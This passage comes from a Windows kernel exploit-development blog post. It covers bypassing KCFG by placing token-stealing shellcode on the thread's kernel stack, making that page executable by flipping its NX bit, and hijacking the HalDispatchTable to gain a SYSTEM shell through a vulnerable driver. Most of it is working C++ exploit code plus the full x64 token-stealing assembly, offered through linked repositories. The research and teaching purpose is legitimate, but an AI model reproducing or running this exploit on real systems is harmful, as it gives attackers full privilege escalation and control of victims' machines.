We see that we can execute code in kernel-mode from a user-mode memory address if we do the double call to the vulnerable IOCTL so why does it crash if we hijack the HalDispatchTable? Connor McGarr actually gave a talk at BlackHat USA 2025 about CFG and KCFG. In it he notes that KCFG acts like software Supervisor Mode Execution Prevention (SMEP). Even if HVCI is disabled KCFG will still act as software SMEP and monitor indirect calls on KCFG protected functions to ensure they never invoke a user-mode address. <a href="https://i.blackhat.com/BH-USA-25/Presentations/USA-25-McGarr-Out-Of-Control-KCFG-And-KCET.pdf">Connor McGarr BHUSE25</a></p>

<p>We saw during our RE that KeQueryIntervalProfile had a call to KCFG (guard_dispatch_icall). This monitors the indirect call and since it sees a user-mode address it will initiate a bugcheck and crash the system. This is evident in the call stack (k command in WinDbg). We see from the call stack that nt!KeQueryIntervalProfile+0x3e calls nt!guard_icall_bugcheck+0x1b and then we progress through the bugcheck crash.
![[post2-ida-kequeryintervalprofile-2 1.png]]
![[post2-windbg-callstack.png]]
So to fix this we either need to pivot to a method that does not include the KCFG indirect call check or use a kernel-mode address to host our shellcode. We already know we can use another call to fortishield to call our shellcode without KCFG interfering so we will search for a kernel-mode address to make the HalDispatchTable hijack work. Again, we must remember that HVCI is disabled in this scenario as it would prevent dynamic code and would not allow kernel memory to be writable and executable at the same time thanks to Mode Based Execution Control (MBEC). MBEC is a hardware feature enabled in the CPU to power HVCI to thwart dynamic code. <a href="https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity?tabs=security">HVCI</a></p>

<p>To use a kernel-mode address for our shellcode we must either already know the address or be able to leak it. It needs to be writable and executable. We could use the concept of a code cave where we find a null page (0x1000 bytes) in the .text section of a module we do have the address for, which is currently nt and fortishield. We could then use the write primitive to make the page writable to copy our shellcode and the use the write primitive to restore it to Read-only and execute. This could lead to a problem with crashing due to PatchGuard detecting our changes to loaded kernel modules if we are not able to make changes, execute shellcode, and restore everything back to normal.</p>

<p>There is another option though. If we dump our KTHREAD for our exploit in WinDbg and check the stack we can see more than enough unused space towards the stack base to host our shellcode. ![[post2-windbg-find-kthread.png]]
![[post2-windbg-kstack.png]]</p>

<p>Manipulating the KSTACK could cause stability issues or other bugs, but we are only using this executable to run our exploit and elevate our process to SYSTEM by stealing the SYSTEM token. We could write our shellcode close to the base, make it executable, and then write this address to HalDsipatchTable+0x8. After elevating our process to system we would then restore the KSTACK to non-executable, restore the HalDispatchTable, and reset the U/S bit on our KTHREAD and spawn a cmd prompt. We will generate a bugcheck if we attempt to use system(“start cmd.exe”) without resetting the U/S bit as the kernel should not be making a user-mode call to start cmd.exe.</p>

<p>The code is mostly the same until line 429 in the main() function. I will only post from 429 down here and you can view the full code in the repo <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/kstack/kstack.cpp">kstack.cpp</a>. The logic is mostly the same, except we do not allocate a user-mode address and flip the U/S bit. Instead we find the Kernel Stack Base (StackBase) from the KTHREAD and subtract 0x100 from it. The value in StackBase is address after the stack ends and could be invalid or belong to something else if it is valid. Trying to read/write to an invalid page will cause a bugcheck. if it is valid and belongs to something else there is no telling what issues it will cause. We store the shellcode in our KSTACK code cave and then make that page executable by enumerating the PTE just like we did for the user-mode address and then flip the NX bit instead of the U/S bit. We then perform our HalDispatchTableHijack and call NtQueryIntervalProfile. After our shellcode run we restore the HalDispatchTable, reset out U/S bit on the KTHREAD, spawn cmd.exe as SYSTEM, and then exit thus killing out thread and it’s KSTACK. There are no changes to the shellcode from the previously listed token_stealing.asm for the bugcheck.cpp earlier in the post. It’s copied below so you don’t have to scroll up for it. <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/kstack/token_stealing.asm">token_stealing.asm</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">ULONGLONG</span> <span class="n">pte_base</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">ppte_base</span><span class="p">;</span>
	<span class="n">_NtWriteVirtualMemory</span> <span class="n">pNtWriteVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtWriteVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtWriteVirtualMemory"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pNtWriteVirtualMemory</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while resolving NtWriteVirtualMemory: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">),</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">kStack</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] KSTACK Base Address: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">kStack</span><span class="p">);</span>

	<span class="n">ULONGLONG</span> <span class="n">kStackB</span> <span class="o">=</span> <span class="p">((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">kStack</span> <span class="o">-</span> <span class="mh">0x100</span><span class="p">);</span>
	<span class="n">ULONGLONG</span><span class="o">*</span> <span class="n">tokensteal</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="o">*</span><span class="p">)</span><span class="n">TokenStealing</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">kStackB</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="c1">//Flip NX bit on Kstack</span>
	<span class="n">ULONGLONG</span> <span class="n">kStack_pteva</span> <span class="o">=</span> <span class="n">get_pxe_address_64</span><span class="p">(</span><span class="n">kStackB</span><span class="p">,</span> <span class="n">pte_base</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">kStack_pteva</span><span class="p">,</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">kStack_pteEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] KSTACK PTE Entry: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">kStack_pteEntry</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">kStack_pteEntry</span> <span class="o">^</span> <span class="p">(</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="mi">63</span><span class="p">);</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStack_pteva</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>

	<span class="n">ULONGLONG</span> <span class="n">HaliQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0xc00a68</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">,</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">orig_HaliQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Oringial HaliQuerySystemInformation Address: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">);</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10200</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">;</span>

	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">_NtQueryIntervalProfile</span> <span class="n">pNtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pNtQueryIntervalProfile</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while resolving NtQueryIntervalProfile: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">ULONG</span> <span class="n">trash</span><span class="p">;</span>
	<span class="n">pNtQueryIntervalProfile</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">trash</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">Sleep</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
	<span class="c1">//restore the HalDispatchTable</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="c1">//restore Previous Mode on the KThread</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">read_qword</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">),</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">kThreadPM</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">kThreadPM</span> <span class="o">^</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"start cmd.exe"</span><span class="p">);</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

<span class="err">}</span>
</code></pre></div></div>

<pre><code class="language-asm">_TEXT	SEGMENT

TokenStealing PROC
	get_eproc:
	nop
	nop
	nop
	nop
	nop
	push	rax										;save registers
	push	rcx										;
	push	r9										;
	push	r8										;
	xor     rax, rax								;Get the EPROCESS of current Process
	mov     rax, qword ptr gs:[rax+188h]			;
	mov     rax, qword ptr [rax+0B8h]				;
	mov     r8, rax									;
	parse_eproc:
	mov     rax, qword ptr [rax+448h]				;walk the linked process list to find SYSTEM process
	sub     rax, 448h								;
	mov     rcx, qword ptr [rax+440h]				;
	cmp     rcx, 4									;
	jne     parse_eproc								;
	steal_token:
	mov     r9, qword ptr [rax+4B8h]				;copy SYSTEM process token to current process
	mov     qword ptr [r8+4B8h], r9					;
	pop		r8										;restire registers
	pop		r9										;
	pop		rcx										;
	pop		rax										;we are about to overwrite this one but stack allignment is a thing
	mov		rax, qword ptr [0b60f0200h]				;HaliQuerySystemInformation
	jmp		rax
	ret

TokenStealing ENDP

_TEXT	ENDS

End
</code></pre>

<p>And for our hard work we receive a nice SYSTEM command shell.![[post2-kstack-success.png]]</p>

  </div>

  <a class="u-url" href="/posts/2025/01/01/Finding-A-Needle-In-A-KSTACK.html" hidden></a>
</article>

      </div>
    </main><link id="fa-stylesheet" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.0.0/css/all.min.css">

<footer class="site-footer h-card">
  <data class="u-url" value="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
      </div>
      <div class="footer-col">
        <p>Blog for tutorials and research in Reverse Engineering binaries and malware, exploit developmet, and Window&#39;s Kernel Internals.  This is a work in progress and will likely be slow to populate. I will update as I hav etime.</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
    <a rel="me" href="https://github.com/ApexPredator-InfoSec" target="_blank" title="ApexPredator-InfoSec Github">
      <span class="grey fa-brands fa-github fa-lg"></span>
    </a>
  </li><li>
    <a rel="me" href="https://x.com/ApexP6975" target="_blank" title="ApexPredator at X">
      <span class="grey fa-brands fa-x-twitter fa-lg"></span>
    </a>
  </li><li>
    <a rel="me" href="https://www.linkedin.com/in/andrew-poole-455908254/" target="_blank" title="ApexPredator at LinkedIn">
      <span class="grey fa-brands fa-linkedin fa-lg"></span>
    </a>
  </li>
  <li>
    <a href="https://apexpredator-infosec.github.io/feed.xml" target="_blank" title="Subscribe to syndication feed">
      <svg class="svg-icon grey" viewbox="0 0 16 16">
        <path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194
          11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0
          13.806c0-1.21.983-2.195 2.194-2.195zM10.606
          16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"
        />
      </svg>
    </a>
  </li>
</ul>
</div>

  </div>

</footer>

</body>

</html>
